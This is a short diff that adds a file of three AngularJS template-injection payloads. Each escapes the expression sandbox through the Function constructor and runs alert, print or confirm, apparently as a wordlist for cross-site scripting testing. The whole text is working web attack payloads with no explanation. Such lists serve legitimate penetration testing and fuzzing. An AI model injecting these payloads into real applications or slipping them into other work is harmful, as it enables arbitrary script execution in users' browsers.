@@ -1,0 +1,4 @@
+{{$on.constructor('alert(1)')()}}
+{{constructor.constructor('print()')()}}
+{{[].filter.constructor('confirm(1)')()}}
+
